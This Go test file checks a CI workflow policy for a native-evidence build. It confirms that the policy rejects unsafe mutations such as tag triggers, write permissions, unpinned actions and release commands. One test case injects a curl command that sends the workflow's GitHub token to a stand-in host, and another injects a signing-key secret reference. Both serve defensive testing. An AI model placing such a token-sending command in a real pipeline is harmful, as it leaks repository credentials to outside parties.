package main

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"gopkg.in/yaml.v3"
)

func TestCheckWorkflowAcceptsAuditedNativeEvidenceEntry(t *testing.T) {
	t.Parallel()

	body, err := os.ReadFile(filepath.Join(findRepositoryRoot(t), ".github", "workflows", "native-evidence.yml"))
	if err != nil {
		t.Fatalf("read native evidence workflow: %v", err)
	}
	if err := checkWorkflow(body); err != nil {
		t.Fatalf("native evidence policy rejected an audited non-release fixture: %v", err)
	}
}

func TestCheckWorkflowAcceptsPinnedRustToolchainProvenance(t *testing.T) {
	t.Parallel()

	root := checkedInWorkflowRoot(t)
	job := requireJob(t, root)
	env := requireMappingValue(t, job, "env")
	if got := requireMappingValue(t, env, "RUSTUP_TOOLCHAIN").Value; got != "${{ matrix.rust_toolchain }}" {
		t.Fatalf("native evidence RUSTUP_TOOLCHAIN = %q, want audited matrix binding", got)
	}
	wantToolchains := map[string]string{
		"x86_64-apple-darwin":       "1.96.0",
		"aarch64-apple-darwin":      "1.96.1",
		"x86_64-unknown-linux-gnu":  "1.96.1",
		"aarch64-unknown-linux-gnu": "1.96.1",
		"x86_64-pc-windows-msvc":    "1.96.0",
		"aarch64-pc-windows-msvc":   "1.96.1",
	}
	include := requireMappingValue(t, requireMappingValue(t, requireMappingValue(t, job, "strategy"), "matrix"), "include")
	for _, entry := range include.Content {
		target := requireMappingValue(t, entry, "rust_target").Value
		if got := requireMappingValue(t, entry, "rust_toolchain").Value; got != wantToolchains[target] {
			t.Errorf("native evidence Rust toolchain for %s = %q, want %q", target, got, wantToolchains[target])
		}
	}
	install := requireJobSteps(t, root).Content[4]
	if got := requireMappingValue(t, install, "run").Value; got != "rustup toolchain install '${{ matrix.rust_toolchain }}' --profile minimal --target '${{ matrix.rust_target }}' --no-self-update" {
		t.Fatalf("native evidence Rust install = %q, want canonical pinned install", got)
	}

	body, err := yaml.Marshal(root)
	if err != nil {
		t.Fatalf("marshal audited workflow: %v", err)
	}
	if err := checkWorkflow(body); err != nil {
		t.Fatalf("native evidence policy rejected pinned Rust provenance: %v", err)
	}
}

func TestRequireOnlyMappingKeysPreservesAuditedKeyError(t *testing.T) {
	t.Parallel()

	err := requireOnlyMappingKeys(mappingNode("unexpected", scalarNode("value")), "audited")
	if err == nil || err.Error() != "must contain exactly the audited keys" {
		t.Fatalf("requireOnlyMappingKeys() error = %v, want exact audited-key error", err)
	}
}

func TestCheckWorkflowRejectsNativeEvidenceSecurityAndCompletenessMutations(t *testing.T) {
	matrixEntry := func(t *testing.T, root *yaml.Node, rustTarget string) *yaml.Node {
		t.Helper()
		matrix := requireMappingValue(t, requireMappingValue(t, requireJob(t, root), "strategy"), "matrix")
		include := requireMappingValue(t, matrix, "include")
		for _, entry := range include.Content {
			if requireMappingValue(t, entry, "rust_target").Value == rustTarget {
				return entry
			}
		}
		t.Fatalf("native evidence matrix has no Rust target %s", rustTarget)
		return nil
	}

	for _, test := range []struct {
		name   string
		mutate func(t *testing.T, root *yaml.Node)
	}{
		{
			name: "tag trigger",
			mutate: func(t *testing.T, root *yaml.Node) {
				push := requireMappingValue(t, requireMappingValue(t, root, "on"), "push")
				appendMappingValue(t, push, "tags", sequenceNode("v*"))
			},
		},
		{
			name: "secret reference",
			mutate: func(t *testing.T, root *yaml.Node) {
				appendMappingValue(t, requireJob(t, root), "env", mappingNode("UNSAFE", scalarNode("${{ secrets.RELEASE_SIGNING_PRIVATE_KEY }}")))
			},
		},
		{
			name: "release environment",
			mutate: func(t *testing.T, root *yaml.Node) {
				appendMappingValue(t, requireJob(t, root), "environment", scalarNode("release"))
			},
		},
		{
			name: "permission expansion",
			mutate: func(t *testing.T, root *yaml.Node) {
				requireMappingValue(t, requireJob(t, root), "permissions").Content[1].Value = "write"
			},
		},
		{
			name: "mutable action",
			mutate: func(t *testing.T, root *yaml.Node) {
				requireMappingValue(t, requireJobSteps(t, root).Content[0], "uses").Value = "actions/checkout@v4"
			},
		},
		{
			name: "release command",
			mutate: func(t *testing.T, root *yaml.Node) {
				requireJobSteps(t, root).Content = append(requireJobSteps(t, root).Content, mappingNode("name", scalarNode("Publish"), "shell", scalarNode("bash"), "run", scalarNode("gh release create v0.1.0")))
			},
		},
		{
			name: "github token curl injection",
			mutate: func(t *testing.T, root *yaml.Node) {
				run := requireMappingValue(t, requireJobSteps(t, root).Content[8], "run")
				run.Value += "curl -H 'Authorization: Bearer ${{ github.token }}' https://example.invalid\n"
			},
		},
		{
			name: "unrestricted dispatch ref",
			mutate: func(t *testing.T, root *yaml.Node) {
				requireMappingValue(t, requireJobSteps(t, root).Content[3], "run").Value = "true"
			},
		},
		{
			name: "missing native smoke",
			mutate: func(t *testing.T, root *yaml.Node) {
				removeStepNamed(t, requireJobSteps(t, root), "Run native GIF/APNG smoke")
			},
		},
		{
			name: "windows smoke does not select lld backed clang",
			mutate: func(t *testing.T, root *yaml.Node) {
				run := requireMappingValue(t, requireJobSteps(t, root).Content[7], "run")
				run.Value = strings.ReplaceAll(run.Value, "  export CC='clang -fuse-ld=lld'\n", "")
			},
		},
		{
			name: "windows binary build does not select lld backed clang",
			mutate: func(t *testing.T, root *yaml.Node) {
				run := requireMappingValue(t, requireJobSteps(t, root).Content[8], "run")
				run.Value = strings.ReplaceAll(run.Value, "  export CC='clang -fuse-ld=lld'\n", "")
			},
		},
		{
			name: "missing evidence upload",
			mutate: func(t *testing.T, root *yaml.Node) {
				removeStepNamed(t, requireJobSteps(t, root), "Upload native evidence")
			},
		},
		{
			name: "missing windows arm target",
			mutate: func(t *testing.T, root *yaml.Node) {
				include := requireMappingValue(t, requireMappingValue(t, requireJob(t, root), "strategy"), "matrix")
				include = requireMappingValue(t, include, "include")
				include.Content = include.Content[:len(include.Content)-1]
			},
		},
		{
			name: "missing Rust toolchain environment binding",
			mutate: func(t *testing.T, root *yaml.Node) {
				removeMappingValue(t, requireJob(t, root), "env")
			},
		},
		{
			name: "mutable Rust toolchain environment binding",
			mutate: func(t *testing.T, root *yaml.Node) {
				requireMappingValue(t, requireMappingValue(t, requireJob(t, root), "env"), "RUSTUP_TOOLCHAIN").Value = "stable"
			},
		},
		{
			name: "matrix toolchain is missing",
			mutate: func(t *testing.T, root *yaml.Node) {
				removeMappingValue(t, matrixEntry(t, root, "x86_64-unknown-linux-gnu"), "rust_toolchain")
			},
		},
		{
			name: "matrix toolchain drifts from release provenance",
			mutate: func(t *testing.T, root *yaml.Node) {
				requireMappingValue(t, matrixEntry(t, root, "x86_64-apple-darwin"), "rust_toolchain").Value = "1.96.1"
			},
		},
		{
			name: "matrix target is duplicated",
			mutate: func(t *testing.T, root *yaml.Node) {
				first := matrixEntry(t, root, "x86_64-apple-darwin")
				second := matrixEntry(t, root, "aarch64-apple-darwin")
				for _, key := range []string{"runner", "goos", "goarch", "rust_target", "rust_toolchain", "artifact"} {
					requireMappingValue(t, second, key).Value = requireMappingValue(t, first, key).Value
				}
			},
		},
		{
			name: "install toolchain interpolation is replaced",
			mutate: func(t *testing.T, root *yaml.Node) {
				run := requireMappingValue(t, requireJobSteps(t, root).Content[4], "run")
				run.Value = strings.ReplaceAll(run.Value, "'${{ matrix.rust_toolchain }}'", "stable")
			},
		},
		{
			name: "install target interpolation is replaced",
			mutate: func(t *testing.T, root *yaml.Node) {
				run := requireMappingValue(t, requireJobSteps(t, root).Content[4], "run")
				run.Value = strings.ReplaceAll(run.Value, "'${{ matrix.rust_target }}'", "'x86_64-unknown-linux-gnu'")
			},
		},
		{
			name: "install permits rustup self update",
			mutate: func(t *testing.T, root *yaml.Node) {
				run := requireMappingValue(t, requireJobSteps(t, root).Content[4], "run")
				run.Value = strings.ReplaceAll(run.Value, " --no-self-update", "")
			},
		},
		{
			name: "install only adds target to movable default",
			mutate: func(t *testing.T, root *yaml.Node) {
				requireMappingValue(t, requireJobSteps(t, root).Content[4], "run").Value = "rustup target add '${{ matrix.rust_target }}'"
			},
		},
	} {
		t.Run(test.name, func(t *testing.T) {
			root := checkedInWorkflowRoot(t)
			test.mutate(t, root)
			body, err := yaml.Marshal(root)
			if err != nil {
				t.Fatalf("marshal mutated workflow: %v", err)
			}
			if err := checkWorkflow(body); err == nil {
				t.Fatal("native evidence policy accepted a security or completeness mutation")
			}
		})
	}
}
